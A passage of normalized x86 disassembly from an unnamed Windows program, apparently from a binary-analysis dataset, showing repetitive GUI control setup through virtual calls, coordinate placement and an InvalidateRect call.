mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x7b4 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x7e4 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x814 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x868 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
mov ecx [ ebx + 0x60c ]
lea eax [ ebx + 0x5f0 ]
cmp ecx ebp
je r-xdata
mov edi rw-data
call sub_4230c0
mov ecx [ rw-data ]
mov edi [ ebx + 0x624 ]
lea esi [ ebx + 0x5f0 ]
mov [ esp + 0x1c ] ecx
call sub_4230c0
mov eax [ esp + 0x1c ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
push eax
mov eax [ edi + 0xc ]
push eax
push esi
call edx
lea esi [ ebx + 0x8bc ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
mov eax rw-data
lea esi [ ebx + 0x514 ]
call sub_41f2d0
test [ edi + 0x4 ] 0x2
mov [ edi + 0x34 ] rw-data
je r-xdata
mov eax rw-data
lea esi [ ebx + 0x628 ]
call sub_41f2d0
mov eax rw-data
lea esi [ ebx + 0x658 ]
call sub_41f2d0
mov eax rw-data
lea esi [ ebx + 0x688 ]
call sub_41f2d0
mov eax rw-data
lea esi [ ebx + 0x7b4 ]
call sub_41f2d0
mov eax rw-data
lea esi [ ebx + 0x7e4 ]
call sub_41f2d0
mov ecx [ rw-data ]
lea edi [ ebx + 0x544 ]
mov [ edi + 0x38 ] ecx
call sub_422a00
mov ecx 0xffffff
cmp [ ebx + 0x580 ] ecx
je r-xdata
mov edx [ ecx ]
push ebp
push ebp
push ebp
push eax
mov eax [ edx + 0x28 ]
call eax
mov ecx [ ebx + 0x530 ]
mov edx [ ecx ]
lea eax [ ebx + 0x514 ]
push 0x39
push 0x1c
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x560 ]
mov edx [ ecx ]
lea eax [ ebx + 0x544 ]
push 0x3a
push 0x56
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x5d0 ]
mov edx [ ecx ]
push 0x1b
push 0x104
lea eax [ ebx + 0x5b4 ]
push 0x51
push 0x56
push eax
mov eax [ edx + 0x1c ]
call eax
mov ecx [ ebx + 0x60c ]
mov edx [ ecx ]
lea eax [ ebx + 0x5f0 ]
push 0x51
push 0x16a
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x644 ]
mov edx [ ecx ]
lea eax [ ebx + 0x628 ]
push 0x89
push 0x1e
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x674 ]
mov edx [ ecx ]
lea eax [ ebx + 0x658 ]
push 0x89
push 0xb2
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x6a4 ]
mov edx [ ecx ]
lea eax [ ebx + 0x688 ]
push 0x89
push 0x144
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x6d4 ]
mov edx [ ecx ]
lea eax [ ebx + 0x6b8 ]
push 0x8c
push 0x33
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x728 ]
mov edx [ ecx ]
lea eax [ ebx + 0x70c ]
push 0x8c
push 0xc6
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x77c ]
mov edx [ ecx ]
lea eax [ ebx + 0x760 ]
push 0x8c
push 0x158
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x7d0 ]
mov edx [ ecx ]
lea eax [ ebx + 0x7b4 ]
push 0x7d
push 0x9b
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x800 ]
mov edx [ ecx ]
lea eax [ ebx + 0x7e4 ]
push 0x7d
push 0x12b
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x830 ]
mov edx [ ecx ]
lea eax [ ebx + 0x814 ]
push 0xad
push 0x2b
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x884 ]
mov edx [ ecx ]
lea eax [ ebx + 0x868 ]
push 0xad
push 0xbf
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x8d8 ]
mov edx [ ecx ]
lea eax [ ebx + 0x8bc ]
push 0xad
push 0x150
push eax
mov eax [ edx + 0x24 ]
call eax
cmp ebx ebp
je r-xdata
lea eax [ ebx + 0x544 ]
mov [ eax + 0x3c ] ecx
mov ecx [ eax + 0x1c ]
cmp ecx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
mov edx [ ecx ]
push ebp
push ebp
push ebp
push eax
mov eax [ edx + 0x28 ]
call eax
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x910 ]
mov esi 0x2
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push edi
mov [ esp + 0x1c ] edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx edi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x940 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push edi
mov [ esp + 0x30 ] edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx edi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0xb20 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push edi
mov [ esp + 0x34 ] edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx edi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0xb74 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push edi
mov [ esp + 0x38 ] edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx edi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0xbc8 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push edi
mov [ esp + 0x3c ] edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx edi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0xa24 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push edi
mov [ esp + 0x40 ] edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx edi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0xa78 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push edi
mov [ esp + 0x44 ] edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx edi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0xacc ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push edi
mov [ esp + 0x48 ] edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx edi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x994 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push edi
mov [ esp + 0x20 ] edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx edi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x9c4 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push edi
mov [ esp + 0x2c ] edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx edi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x9f4 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push edi
mov [ esp + 0x28 ] edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx edi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0xc1c ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] 0x3f0
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
mov [ esp + 0x18 ] esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0xc54 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
mov [ esp + 0x4c ] esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x1c ]
cmp ecx ebp
je r-xdata
mov edi rw-data
call sub_4230c0
mov ecx [ rw-data ]
mov esi [ esp + 0x14 ]
mov edi [ esi + 0x34 ]
mov [ esp + 0x20 ] ecx
call sub_4230c0
mov eax [ esp + 0x20 ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
push eax
mov eax [ edi + 0xc ]
push eax
push esi
call edx
mov edi [ esp + 0x24 ]
add ebx 0xca8
mov [ ebx + 0x1c ] ecx
mov [ ebx + 0x20 ] ebp
mov [ ebx + 0x24 ] ebp
mov [ ebx + 0x4 ] 0x2
mov [ ebx + 0x8 ] ebp
mov [ ebx + 0xc ] ebp
mov [ ebx + 0x10 ] ebp
mov [ ebx + 0x14 ] ebp
mov [ ebx + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push ebx
call eax
mov edx [ ebx ]
mov eax [ edx + 0x8 ]
mov ecx ebx
call eax
mov edx [ ebx ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx ebx
call eax
mov edx [ ebx ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx ebx
call eax
mov esi [ esp + 0x18 ]
mov eax rw-data
call sub_41f2d0
mov eax [ esp + 0x14 ]
test [ eax + 0x4 ] 0x2
mov [ eax + 0x34 ] rw-data
je r-xdata
mov esi [ esp + 0x1c ]
mov eax rw-data
call sub_41f2d0
mov ebp [ esp + 0x28 ]
mov eax rw-data
mov esi ebp
call sub_41f2d0
mov eax rw-data
mov esi edi
call sub_41f2d0
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push 0x39
push 0x1d
push eax
mov eax [ edx + 0x24 ]
call eax
mov eax [ esp + 0x2c ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push 0x3c
push 0x8c
push eax
mov eax [ edx + 0x24 ]
call eax
mov eax [ esp + 0x30 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push 0x5d
push 0x14b
push eax
mov eax [ edx + 0x24 ]
call eax
mov eax [ esp + 0x34 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push 0x78
push 0x14b
push eax
mov eax [ edx + 0x24 ]
call eax
mov eax [ esp + 0x38 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push 0x91
push 0x14b
push eax
mov eax [ edx + 0x24 ]
call eax
mov eax [ esp + 0x3c ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push 0x60
push 0x9f
push eax
mov eax [ edx + 0x24 ]
call eax
mov eax [ esp + 0x40 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push 0x7c
push 0x9f
push eax
mov eax [ edx + 0x24 ]
call eax
mov eax [ esp + 0x44 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push 0x96
push 0x9f
push eax
mov eax [ edx + 0x24 ]
call eax
mov eax [ esp + 0x1c ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push 0x60
push 0x8c
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
mov eax [ edx + 0x24 ]
push 0x7c
push 0x8c
push ebp
call eax
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
mov eax [ edx + 0x24 ]
push 0x96
push 0x8c
push edi
call eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push 0xbe
push 0x14d
push eax
mov eax [ edx + 0x24 ]
call eax
mov eax [ esp + 0x48 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push 0x60
push 0x8c
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x1c ]
mov edx [ ecx ]
mov eax [ edx + 0x24 ]
push 0x7c
push 0x8c
push ebx
call eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x3c
retn
mov edx [ ecx ]
push ebp
push ebp
push ebp
push eax
mov eax [ edx + 0x28 ]
call eax
sub_40b260
push 0xffffffff
push sub_45af40
mov eax [ fs : 0x0 ]
push eax
sub esp 0x78
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x70 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8c ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x9c ]
mov eax [ ebp + 0x188 ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
push r--data
lea ebx [ ebp + 0x18c ]
push ebx
call sub_41ff60
push r--data
lea eax [ ebp + 0x1e0 ]
push eax
call sub_41ff60
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x18 ] eax
push r--data
push 0x3ec
push r--data
lea edi [ esp + 0x24 ]
mov [ esp + 0xa0 ] 0x0
call sub_412480
add esp 0xc
lea esi [ ebp + 0x910 ]
xor edi edi
call sub_40d7c0
lea esi [ ebp + 0x514 ]
call sub_40d4e0
mov edi 0x1
mov esi ebx
call sub_40d210
cmp [ ebp + 0xe28 ] 0x0
je r-xdata
cmp eax 0x2
jne r-xdata
lea ecx [ esp + 0x68 ]
push ecx
call sub_40f4f0
mov [ esp + 0x94 ] 0x1
xor edx edx
mov edi 0x7
push 0x5
mov eax r--data
lea esi [ esp + 0x50 ]
mov [ esp + 0x68 ] edi
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x54 ] dx
call sub_429cc0
mov eax esi
push eax
lea ebx [ esp + 0x6c ]
mov [ esp + 0x98 ] 0x2
call sub_428670
mov [ esp + 0x94 ] 0x1
cmp [ esp + 0x64 ] 0x8
jb r-xdata
cmp [ ebp + 0xe29 ] 0x0
je r-xdata
mov eax [ ebp + 0x2bc ]
lea edx [ ebp + 0x2b8 ]
mov ecx eax
and ecx edi
jne r-xdata
mov eax [ ebp + 0x4 ]
push 0x1
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov ecx [ esp + 0x8c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x70 ]
xor ecx esp
call sub_43f96b
add esp 0x84
retn 0x4
lea eax [ ebp + 0x940 ]
push r--data
push eax
call sub_41ff60
lea esi [ ebp + 0x514 ]
xor edi edi
call sub_40d4e0
lea esi [ ebp + 0x18c ]
call sub_40d210
lea esi [ ebp + 0x910 ]
mov edi 0x1
call sub_40d7c0
cmp [ ebp + 0xe28 ] 0x0
mov [ esp + 0x1f ] 0x0
je r-xdata
xor edx edx
push 0x6
mov eax r--data
lea esi [ esp + 0x50 ]
mov [ esp + 0x68 ] edi
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x54 ] dx
call sub_429cc0
mov eax esi
push eax
lea ebx [ esp + 0x6c ]
mov [ esp + 0x98 ] 0x3
call sub_428670
mov [ esp + 0x94 ] 0x1
cmp [ esp + 0x64 ] 0x8
jb r-xdata
mov ecx [ esp + 0x50 ]
push ecx
call sub_43f960
add esp 0x4
cmp [ ebp + 0xe2a ] 0x0
je r-xdata
mov eax [ ebp + 0x2bc ]
lea edx [ ebp + 0x2b8 ]
mov ecx eax
and ecx edi
jne r-xdata
push r--data
lea esi [ ebp + 0x348 ]
push esi
call sub_41ff60
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx edi
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax edi
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
cmp [ ebp + 0xe29 ] 0x0
je r-xdata
mov eax [ ebp + 0x998 ]
lea edx [ ebp + 0x994 ]
mov ecx eax
and ecx edi
jne r-xdata
xor edx edx
push edi
mov eax r--data
lea esi [ esp + 0x50 ]
mov [ esp + 0x68 ] edi
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x54 ] dx
call sub_429cc0
mov eax esi
push eax
lea ebx [ esp + 0x6c ]
mov [ esp + 0x98 ] 0x4
call sub_428670
mov [ esp + 0x94 ] 0x1
cmp [ esp + 0x64 ] 0x8
jb r-xdata
mov ecx [ esp + 0x50 ]
push ecx
call sub_43f960
add esp 0x4
mov [ esp + 0x94 ] 0xffffffff
mov eax [ esp + 0x18 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov eax [ ebp + 0x2bc ]
lea edx [ ebp + 0x2b8 ]
mov ecx eax
and ecx edi
jne r-xdata
push r--data
lea esi [ ebp + 0x348 ]
push esi
call sub_41ff60
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx edi
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
cmp [ ebp + 0xe29 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push edi
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
cmp [ ebp + 0xe2a ] 0x0
je r-xdata
mov eax [ ebp + 0x998 ]
lea edx [ ebp + 0x994 ]
mov ecx eax
and ecx edi
jne r-xdata
push r--data
lea esi [ ebp + 0xa24 ]
push esi
call sub_41ff60
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx edi
jne r-xdata
mov ecx [ edx + 0x1c ]
or eax edi
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
lea eax [ ebp + 0x544 ]
lea edi [ esp + 0x68 ]
call sub_41d750
lea esi [ ebp + 0x910 ]
xor edi edi
call sub_40d7c0
lea esi [ ebp + 0x18c ]
call sub_40d210
lea esi [ ebp + 0x514 ]
mov edi 0x1
call sub_40d4e0
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
xor esi esi
shr eax 0x1f
add eax edx
mov [ esp + 0x28 ] esi
je r-xdata
mov ecx [ esp + 0x50 ]
push ecx
call sub_43f960
add esp 0x4
mov ecx [ eax ]
